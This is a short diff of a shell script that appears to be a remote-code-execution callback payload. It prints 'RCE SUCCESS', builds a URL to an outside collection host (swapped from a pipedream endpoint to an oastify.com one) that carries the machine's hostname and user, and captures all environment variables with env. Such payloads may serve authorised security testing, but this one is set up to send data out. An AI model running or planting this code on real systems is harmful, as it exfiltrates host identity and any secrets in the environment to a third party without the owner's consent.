@@ -2,7 +2,7 @@ echo "------------"
 echo "RCE SUCCESS"
 echo "------------"
 
-URL="https://45916c134a9cdb740e1c9807952ed21d.m.pipedream.net/RCE/$1?host=$(hostname)&user=$(whoami)"
+URL="https://m2pd6jd0efujkqq7l2xd8k3i0966uwil.oastify.com/RCE/$1?host=$(hostname)&user=$(whoami)"
 ENV=$(env)
 
 # Install curl or wget
